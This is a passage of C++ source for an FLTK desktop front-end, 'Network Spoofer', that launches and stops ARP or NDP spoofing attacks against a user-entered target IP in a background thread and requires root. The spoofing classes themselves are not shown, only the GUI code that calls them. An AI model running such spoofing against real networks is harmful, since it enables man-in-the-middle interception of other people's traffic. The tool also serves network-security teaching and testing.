            std::string target = inp_target_ip->value();
            int attack_type = choice_attack_type->value();

            if (interface.empty() || source.empty() || target.empty()) {
                fl_alert("Please fill in all fields: Interface, Source IP, and Target IP.");
                return;
            }
            
            attack_running = true;
            
            // Launch attack in a separate thread (So the GUI still functions)
            attack_thread = std::make_unique<std::thread>([this, interface, source, target, attack_type]() {
                try {
                    // ARP Spoofing
                    if (attack_type == 0) {
                        ARPSpoof spoof;
                        spoof.target_ip = target.c_str();
                        spoof.source_ip = source.c_str();
                        spoof.if_name = interface.c_str();
                        spoof.run(attack_running);
                    }
                    // NDP Spoofing
                    else {
                        NDPSpoof spoof;
                        spoof.target_ip = target.c_str();
                        spoof.source_ip = source.c_str();
                        spoof.if_name = interface.c_str();
                        spoof.run(attack_running);
                    }
                } catch (const std::exception& e) {
                    std::cerr << "Exception in attack thread: " << e.what() << std::endl;
                }
            });

            // Update GUI state
            btn_start->deactivate();
            btn_stop->activate();
            out_status->value("Attack running...");
        }

        // Function to stop spoof attack
        void stop_attack() {
            if (attack_running) {
                attack_running = false;
                if (attack_thread && attack_thread->joinable()) {
                    attack_thread->join();
                }
            }
            
            // Update GUI state
            btn_start->activate();
            btn_stop->deactivate();
            out_status->value("Idle. Attack stopped.");
        }


        /* ------------- Static Callbacks for FLTK ------------ */
        static void start_attack_cb(Fl_Widget* w, void* data) {
            static_cast<SpooferGUI*>(data)->start_attack();
        };

        static void stop_attack_cb(Fl_Widget* w, void* data) {
            static_cast<SpooferGUI*>(data)->stop_attack();
        };

        static void ip_field_changed_cb(Fl_Widget* w, void* data) {
            SpooferGUI* gui = static_cast<SpooferGUI*>(data);
            gui->NDP_IP_Update();
        };
};




/* ------------------------------- Entry Point ------------------------------ */
int main()
{
    // Elevated privileges check
    if (getuid() != 0) {
        fl_alert("This program requires root privileges to create raw sockets. Please run with sudo.");
        return 1;
    }


    SpooferGUI gui(400, 260, "Network Spoofer");
    gui.show();


    return Fl::run();
}